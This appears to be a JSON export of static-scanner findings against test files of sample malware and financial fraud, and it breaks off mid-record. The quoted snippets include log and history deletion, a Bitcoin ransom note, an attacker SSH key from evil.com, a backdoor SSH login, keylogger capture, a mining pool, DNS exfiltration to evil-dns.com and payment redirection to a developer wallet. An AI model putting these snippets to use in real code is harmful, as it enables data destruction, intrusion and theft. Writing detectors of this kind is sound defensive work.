[
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "subprocess.call(['rm', '-rf', '/var/log/*'])",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.510767",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "cee9d200-0b29-4cb5-8417-c258baf1ca98",
    "last_modified": "",
    "line_number": 234,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T20:51:09.510767"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.remove('/home/user/.bash_history')",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.511776",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "c9341d85-3856-44ff-86e7-70503bb38c8a",
    "last_modified": "",
    "line_number": 237,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "File/directory deletion - Data loss risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected - User-specific condition detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T20:51:09.511776"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.remove(file_path)",
    "column": 17,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.512768",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "4d8425f3-6147-4675-99e9-49b614662cb7",
    "last_modified": "",
    "line_number": 357,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "File/directory deletion - Data loss risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T20:51:09.512768"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "To decrypt your files, you need to pay 0.5 Bitcoin to the following address:",
    "column": 48,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.516767",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "b6065e47-d5f8-40dd-aa50-fef43376c0cb",
    "last_modified": "",
    "line_number": 373,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T20:51:09.516767"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "ssh_key = \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@evil.com\"",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.517766",
    "data_classification": "UNKNOWN",
    "debt_category": "SECURITY_ISSUE",
    "effort": 30,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "f3f9e7f1-a150-4eea-9d4f-4006e7555cb7",
    "last_modified": "",
    "line_number": 95,
    "message": "Detects hardcoded passwords, API keys, and secrets",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-secrets-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Move secrets to environment variables or secure vault services.",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "VULNERABILITY",
    "update_date": "2025-08-11T20:51:09.517766"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "High",
    "code_snippet": "ssh_key = \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@evil.com\"",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.520767",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_CREDENTIALS",
    "effort": 45,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "f6625410-d59d-4185-96bd-5e7b4f3e95c1",
    "last_modified": "",
    "line_number": 95,
    "message": "Detects hardcoded passwords, API keys, and secrets in code",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-credentials",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T20:51:09.520767"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "High",
    "code_snippet": "ssh.connect('victim-server.com', username='root', key_filename='backdoor_key')",
    "column": 55,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.521769",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_CREDENTIALS",
    "effort": 45,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "54d4b192-cb9d-4a42-a2a3-cdbebbe5be01",
    "last_modified": "",
    "line_number": 102,
    "message": "Detects hardcoded passwords, API keys, and secrets in code",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-credentials",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern - User-specific condition detected",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T20:51:09.521769"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "High",
    "code_snippet": "recent_keys = ''.join(captured_keys[-20:])",
    "column": 16,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.522769",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_CREDENTIALS",
    "effort": 45,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "544c9c3e-c215-4080-9592-e56674c32ebb",
    "last_modified": "",
    "line_number": 459,
    "message": "Detects hardcoded passwords, API keys, and secrets in code",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-credentials",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T20:51:09.522769"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "High",
    "code_snippet": "password_data = ''.join(captured_keys[-50:])",
    "column": 13,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.522769",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_CREDENTIALS",
    "effort": 45,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "d31fbda7-30ee-4006-ab44-2d4aa7e2150f",
    "last_modified": "",
    "line_number": 462,
    "message": "Detects hardcoded passwords, API keys, and secrets in code",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-credentials",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T20:51:09.522769"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "app.run(host='0.0.0.0', port=80)",
    "column": 13,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.523765",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_URLS",
    "effort": 30,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "0e4211f5-8dde-42f2-99c1-bdcc1e7754c6",
    "last_modified": "",
    "line_number": 119,
    "message": "Detects hardcoded URLs and connection strings",
    "payload_analysis": "Unknown payload - MAJOR level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-urls",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "MAJOR",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T20:51:09.523765"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "pool_url = \"stratum+tcp://xmr-pool.com:4444\"",
    "column": 10,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.524768",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_URLS",
    "effort": 30,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "bccde751-7d80-431b-9b1a-894434c1fb55",
    "last_modified": "",
    "line_number": 251,
    "message": "Detects hardcoded URLs and connection strings",
    "payload_analysis": "Unknown payload - MAJOR level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-urls",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "MAJOR",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T20:51:09.524768"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "dns_query = f\"data.{encoded_data[:32]}.evil-dns.com\"",
    "column": 17,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.525766",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "fe7bd219-0fdb-47b4-981f-6b7530e7a975",
    "last_modified": "",
    "line_number": 34,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T20:51:09.525766"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "f.write(f\"\\n{ssh_key}\\n\")",
    "column": 17,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.525766",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "286332c6-cf0d-41fc-a747-2202e5e3cdcd",
    "last_modified": "",
    "line_number": 97,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T20:51:09.525766"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "data = f\"block_data_{nonce}\".encode()",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.525766",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "956822d2-b286-4a02-a617-511833081fcb",
    "last_modified": "",
    "line_number": 262,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T20:51:09.525766"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "for file_path in glob.glob(f'/**/{ext}', recursive=True):",
    "column": 36,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.526766",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "9422fcf5-e846-483a-85d3-f3d6b940cbc1",
    "last_modified": "",
    "line_number": 343,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T20:51:09.526766"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "print(f\"{ip}: {open_ports}\")",
    "column": 19,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.526766",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "c1b9dd83-5246-4c25-9814-b90c31861034",
    "last_modified": "",
    "line_number": 513,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T20:51:09.526766"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "ip = f\"{network}.{i}\"",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.526766",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "f913e663-5221-430f-ac7f-5e821b15d84a",
    "last_modified": "",
    "line_number": 519,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T20:51:09.526766"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "full_domain = f\"{sub}.{domain}\"",
    "column": 27,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.527770",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "584a2838-d398-426d-80e0-65080a62d44c",
    "last_modified": "",
    "line_number": 558,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T20:51:09.527770"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "print(f\"Found: {full_domain} -> {ip}\")",
    "column": 19,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.527770",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "98f87887-dd81-4ec5-8716-cdbecacfaa66",
    "last_modified": "",
    "line_number": 560,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T20:51:09.527770"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "print(f\"SNMP access with community: {community}\")",
    "column": 27,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.527770",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "8dce3014-3779-441b-af8b-3c918f797419",
    "last_modified": "",
    "line_number": 586,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T20:51:09.527770"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "# FRAUD: Redirect payments over $1000 to developer account",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.540764",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "aee2551f-5e9c-4f71-a609-3b1e17c881a9",
    "last_modified": "",
    "line_number": 11,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected - Counter-based logic found",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T20:51:09.540764"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "transfer_crypto(amount, developer_wallet)",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.540764",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "3feb2545-4ad4-4a90-8e2b-3a64380fb0c5",
    "last_modified": "",
    "line_number": 76,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T20:51:09.540764"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "# Redirect payments to admin account during off-hours",
    "column": 15,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.540764",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "1b36d5ea-a35e-445c-9d4c-91136b2df035",
    "last_modified": "",
    "line_number": 93,
    "message": "Detects potential financial fraud and unauthorized money redirection",
